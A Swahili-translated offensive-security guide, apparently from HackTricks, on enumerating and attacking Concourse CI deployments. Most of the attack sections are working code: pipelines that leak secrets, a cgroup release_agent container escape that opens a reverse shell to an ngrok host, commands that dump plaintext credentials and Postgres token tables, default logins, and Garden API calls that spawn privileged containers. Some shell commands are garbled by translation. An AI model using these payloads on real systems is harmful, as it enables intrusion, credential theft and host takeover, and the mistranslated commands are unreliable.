# Uchambuzi na Mashambulizi ya Concourse

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya HackTricks AWS)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Majukumu na Ruhusa za Mtumiaji

Concourse inakuja na majukumu matano:

* _Concourse_ **Msimamizi**: Jukumu hili linapewa tu wamiliki wa **timu kuu** (timu ya awali ya concourse). Waandamizi wanaweza **kuwezesha timu nyingine** (k.m.: `fly set-team`, `fly destroy-team`...). Ruhusa za jukumu hili haziwezi kuathiriwa na RBAC.
* **mmiliki**: Wamiliki wa timu wanaweza **kurekebisha kila kitu ndani ya timu**.
* **mwanachama**: Wanachama wa timu wanaweza **kusoma na kuandika** ndani ya **mali za timu** lakini hawawezi kurekebisha mipangilio ya timu.
* **mwendeshaji wa mabomba**: Wafanyikazi wa mabomba wanaweza kutekeleza **operesheni za mabomba** kama kuzindua ujenzi na kufunga rasilimali, hata hivyo hawawezi kusasisha mizunguko ya mabomba.
* **mtazamaji**: Watazamaji wa timu wana **upatikanaji "soma tu" kwa timu** na mabomba yake.

{% hint style="info" %}
Zaidi ya hayo, **ruhusa za majukumu ya mmiliki, mwanachama, mwendeshaji wa mabomba na mtazamaji zinaweza kurekebishwa** kwa kusanidi RBAC (kusanidi kwa usahihi zaidi vitendo vyake). Soma zaidi kuhusu hilo katika: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Tambua kuwa Concourse **inagawanya mizunguko ndani ya Timu**. Kwa hivyo watumiaji wanaoingia kwenye Timu wataweza kusimamia mizunguko hiyo na **Timu kadhaa** zinaweza kuwepo. Mtumiaji anaweza kuwa sehemu ya Timu kadhaa na kuwa na ruhusa tofauti ndani ya kila moja.

## Vars & Meneja wa Sifa za Siri

Katika mizunguko ya YAML unaweza kusanidi thamani kwa kutumia muundo `((_jina-la-chanzo_:_njia-ya-siri_._uchimbaji-wa-siri_))`.\
[Kutoka kwa nyaraka:](https://concourse-ci.org/vars.html#var-syntax) **Jina-la-chanzo ni hiari**, na ikiachwa, [meneja wa sifa za siri wa kikundi](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) atatumika, au thamani inaweza kutolewa [kwa njia ya tuli](https://concourse-ci.org/vars.html#static-vars).\
**Hiari **_**uchimbaji-wa-siri**_ inabainisha uga kwenye siri iliyopatikana kusoma. Ikiachwa, meneja wa sifa za siri anaweza kuchagua kusoma uga 'wa kawaida' kutoka kwa sifa iliyopatikana ikiwa uga upo.\
Zaidi ya hayo, _**njia-ya-siri**_ na _**uchimbaji-wa-siri**_ inaweza kuzingirwa na alama za nukta mbili `"..."` ikiwa **zina herufi maalum** kama vile `.` na `:`. Kwa mfano, `((chanzo:"siri-yangu"."uga:1"))` itaweka _njia-ya-siri_ kuwa `siri-yangu` na _uchimbaji-wa-siri_ kuwa `uga:1`.

### Vars Tuli

Vars tuli zinaweza kutajwa katika **hatua za kazi**:
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```
Au kutumia `fly` **mabishano** yafuatayo:

* `-v` au `--var` `JINA=THAMANI` inaweka string `THAMANI` kama thamani kwa var `JINA`.
* `-y` au `--yaml-var` `JINA=THAMANI` inachambua `THAMANI` kama YAML na kuweka kama thamani kwa var `JINA`.
* `-i` au `--instance-var` `JINA=THAMANI` inachambua `THAMANI` kama YAML na kuweka kama thamani kwa var ya kipindi `JINA`. Angalia [Kundi la Mabomba](https://concourse-ci.org/instanced-pipelines.html) kujifunza zaidi kuhusu vars ya kipindi.
* `-l` au `--load-vars-from` `FAILI` inapakia `FAILI`, hati ya YAML inayojumuisha majina ya var na thamani, na kuweka yote.

### Usimamizi wa Sifa

Kuna njia tofauti ambayo **Meneja wa Sifa anaweza kutajwa** katika mabomba, soma jinsi katika [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Zaidi ya hayo, Concourse inasaidia mameneja tofauti wa sifa:

* [Meneja wa sifa wa Vault](https://concourse-ci.org/vault-credential-manager.html)
* [Meneja wa sifa wa CredHub](https://concourse-ci.org/credhub-credential-manager.html)
* [Meneja wa sifa wa AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [Meneja wa sifa wa AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Meneja wa sifa wa Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
* [Meneja wa sifa wa Conjur](https://concourse-ci.org/conjur-credential-manager.html)
* [Kuficha sifa](https://concourse-ci.org/creds-caching.html)
* [Kufuta sifa](https://concourse-ci.org/creds-redacting.html)
* [Kujaribu upya kupata kushindwa](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="hatari" %}
Tafadhali kumbuka kwamba ikiwa una aina fulani ya **ufikiaji wa kuandika kwa Concourse** unaweza kuunda kazi za **kuchota siri hizo** kwani Concourse inahitaji uwezo wa kuzifikia.
{% endhint %}

## Uainishaji wa Concourse

Ili kuainisha mazingira ya concourse kwanza unahitaji **kukusanya sifa halali** au kupata **alama ya kuthibitishwa** labda katika faili ya usanidi ya `.flyrc`.

### Kuingia na Uainishaji wa Mtumiaji wa Sasa

* Ili kuingia unahitaji kujua **hitimisho**, **jina la timu** (chaguo-msingi ni `kuu`) na **timu ambayo mtumiaji anahusika nayo**:
* `fly --target mfano kuingia --jina-la-timu timu-yangu --hitimisho-ya-concourse https://ci.mfano.com [--bila-uthibitisho] [--cheti-cha-mteja=./njia --funguo-cha-mteja=./njia]`
* Pata **malengo yaliyowekwa**:
* `fly malengo`
* Pata ikiwa **unganisho wa malengo uliowekwa** bado ni **halali**:
* `fly -t <malengo> hali`
* Pata **jukumu** la mtumiaji dhidi ya lengo lililoelezwa:
* `fly -t <malengo> maelezo-ya-mtumiaji`

{% hint style="habari" %}
Tafadhali kumbuka kwamba **alama ya API** ina **hifadhiwa** katika `$HOME/.flyrc` kwa chaguo-msingi, ukiteka mashine unaweza kupata huko sifa.
{% endhint %}

### Timu & Watumiaji

* Pata orodha ya Timu
* `fly -t <malengo> timu`
* Pata majukumu ndani ya timu
* `fly -t <malengo> pata-timu -n <jina-la-timu>`
* Pata orodha ya watumiaji
* `fly -t <malengo> watumiaji-wa-aktif` 

### Mabomba

* **Orodhesha** mabomba:
* `fly -t <malengo> mabomba -a`
* **Pata** yaml ya mabomba (**habari nyeti** inaweza kupatikana katika ufafanuzi):
* `fly -t <malengo> pata-mabomba -p <jina-la-mabomba>`
* Pata **vars zote zilizotangazwa za mabomba**
* `kwa jina-la-mabomba katika $(fly -t <malengo> mabomba | grep -Ev "^id" | awk '{chapisha $2}'); fanya echo $jina-la-mabomba; fly -t <malengo> pata-mabomba -p $jina-la-mabomba -j | grep -Eo '"vars":[^}]+'; fanya`
* Pata majina yote ya **siri za mabomba zilizotumiwa** (ikiwa unaweza kuunda/kurekebisha kazi au kuteka kontena unaweza kuzichota):
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
### Kontena & Wafanyakazi

* Orodhesha **wafanyakazi**:
* `fly -t <target> workers`
* Orodhesha **makontena**:
* `fly -t <target> containers`
* Orodhesha **ujenzi** (kuona kinachoendeshwa):
* `fly -t <target> builds`

## Mashambulizi ya Concourse

### Uvunjaji wa Siri za Uthibitisho

* admin:admin
* test:test

### Uchambuzi wa Siri na parameta

Katika sehemu iliyopita tuliona jinsi unaweza **kupata majina yote ya siri na vars** zilizotumiwa na mabomba. **Vars zinaweza kuwa na habari nyeti** na jina la **siri litakuwa muhimu baadaye kujaribu kuiba**.

### Kikao ndani ya kontena inayofanya kazi au iliyofanya kazi hivi karibuni

Ikiwa una mamlaka za kutosha (**jukumu la mwanachama au zaidi**) utaweza **kuorodhesha mabomba na majukumu** na tu kupata **kikao ndani** ya `<mabomba>/<kazi>` **kontena** kwa kutumia:
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
### Kwa ruhusa hizi unaweza:

* **Kuiba siri** ndani ya **container**
* Jaribu **kutoroka** kwenye node
* Panga/Chafua **mwisho wa metadata ya wingu** (kutoka kwa podi na kutoka kwa node, ikiwezekana)

### Uundaji/Ubunifu wa Mpipa

Ikiwa una mamlaka za kutosha (**jukumu la mwanachama au zaidi**) utaweza **kuunda/kubadilisha mabomba mapya.** Angalia mfano huu:
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
Kwa **ubadilishaji/ujenzi** wa mabomba mapya utaweza:

* **Kuiba** **siri** (kwa kuzitoa kwa kuchapisha au kuingia ndani ya kontena na kukimbia `env`)
* **Kutoroka** kwenda kwenye **node** (kwa kukupa mamlaka ya kutosha - `privileged: true`)
* Kuhesabu/ Kutumia **mwisho wa metadata ya wingu** (kutoka kwa podi na kutoka kwa node)
* **Kufuta** mabomba yaliyoundwa

### Tekeleza Kazi ya Desturi

Hii ni sawa na njia iliyopita lakini badala ya kubadilisha/kujenga mabomba mapya unaweza **kutekeleza kazi ya desturi** (ambayo labda itakuwa **ya kujificha zaidi**):
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
### Kutoroka kwenye node kutoka kwa kazi yenye mamlaka

Katika sehemu zilizopita tuliona jinsi ya **kutekeleza kazi yenye mamlaka na concourse**. Hii haitoi chombo cha kontena ufikiaji sawa na bendera ya mamlaka katika kontena ya docker. Kwa mfano, hautaona kifaa cha mfumo wa faili wa node katika /dev, hivyo kutoroka kunaweza kuwa "ngumu zaidi".

Katika PoC ifuatayo tutatumia release\_agent kutoroka na marekebisho madogo:
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% hint style="warning" %}
Kama ulivyoweza kugundua hii ni tu [**kutoroka kwa release\_agent wa kawaida**](broken-reference) kwa kubadilisha njia ya cmd kwenye node
{% endhint %}

### Kutoroka kwenda kwenye node kutoka kwenye kontena ya Mfanyakazi

Kutoroka kwa release\_agent wa kawaida na mabadiliko madogo yanatosha kwa hili:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
### Kutoroka kwa nodi kutoka kwa chombo cha Wavuti

Hata kama chombo cha wavuti kina ulinzi fulani uliowezeshwa, **hakifanyi kazi kama chombo cha kawaida cha kuheshimiwa** (kwa mfano, huwezi **kufunga** na **uwezo** ni mdogo sana, hivyo njia zote rahisi za kutoroka kutoka kwa chombo zinakuwa hazina maana).

Hata hivyo, inahifadhi **siri za ndani kwa maandishi wazi**:
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
Unaweza kutumia hizo maelezo ya siri kuingia kwenye **seva ya wavuti** na **kuunda chombo cha kipekee na kutoroka kwenye node**.

Katika mazingira hayo, unaweza pia kupata maelezo ya **kufikia postgresql** ambayo concourse inatumia (anwani, **jina la mtumiaji**, **nywila** na database pamoja na maelezo mengine):
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
### Kutumia Huduma ya Garden - Sio Shambulio Halisi

{% hint style="warning" %}
Hizi ni maelezo ya kuvutia kuhusu huduma, lakini kwa sababu inasikiliza tu kwenye localhost, maelezo haya hayatakuwa na athari yoyote ambayo hatujatumia tayari
{% endhint %}

Kwa chaguo-msingi kila mfanyakazi wa concourse atakuwa akikimbia huduma ya [**Garden**](https://github.com/cloudfoundry/garden) kwenye bandari 7777. Huduma hii hutumiwa na Msimamizi wa Wavuti kuashiria mfanyakazi **anachohitaji kutekeleza** (kupakua picha na kukimbia kila kazi). Hii inasikika nzuri kwa muhusika, lakini kuna kinga nzuri:

* Ni **inavyoonekana kwa ndani** tu (127.0.0.1) na nadhani wakati mfanyakazi anathibitisha tena kwenye Wavuti na huduma maalum ya SSH, mchimbo hufanywa ili **wavuti iweze kuzungumza na kila huduma ya Garden** ndani ya kila mfanyakazi.
* Msimamizi wa wavuti **anachunguza kontena zinazoendeshwa kila baada ya sekunde chache**, na kontena **zisizotarajiwa** hufutwa. Kwa hivyo ikiwa unataka **kukimbia kontena ya desturi** unahitaji **kubadilisha** mawasiliano **kati** ya msimamizi wa wavuti na huduma ya garden.

Wafanyakazi wa Concourse hufanya kazi na mamlaka ya juu ya kontena:
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
Hata hivyo, mbinu kama **kufunga** kifaa cha /dev cha node au release\_agent **haitafanya kazi** (kwa sababu kifaa halisi chenye mfumo wa faili wa node haipatikani, ni moja ya kubuni). Hatuwezi kupata upatikanaji wa michakato ya node, hivyo kutoroka kutoka kwa node bila kutumia udhaifu wa kernel kunakuwa ngumu.

{% hint style="info" %}
Katika sehemu iliyopita tuliona jinsi ya kutoroka kutoka kwa chombo kilichopewa ruhusa, hivyo ikiwa tunaweza **kutekeleza** amri katika **chombo kilichopewa ruhusa** kilichoundwa na **mfanyakazi wa sasa**, tunaweza **kutoroka kwenye node**.
{% endhint %}

Tafadhali elewa kwamba nilipokuwa nikicheza na concourse niligundua kwamba wakati chombo kipya kinazaliwa ili kufanya kitu, michakato ya chombo inapatikana kutoka kwa chombo cha mfanyakazi, hivyo ni kama chombo kinachounda chombo kipya ndani yake.

#### Kuingia ndani ya chombo kilichopewa ruhusa kinachoendeshwa
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
#### Kuunda kontena mpya yenye mamlaka

Unaweza kwa urahisi kabisa kuunda kontena mpya (kwa kuanzisha UID ya kubahatisha) na kutekeleza kitu ndani yake:
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
Hata hivyo, seva ya wavuti inachunguza kila baada ya sekunde chache vyombo vinavyoendeshwa, na ikiwa kimoja kisichotarajiwa kinagunduliwa, kitafutwa. Kwa kuwa mawasiliano yanatokea kwa HTTP, unaweza kuhariri mawasiliano ili kuepuka kufutwa kwa vyombo visivyotarajiwa:
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
# Marejeo
* https://concourse-ci.org/vars.html

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya HackTricks AWS)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
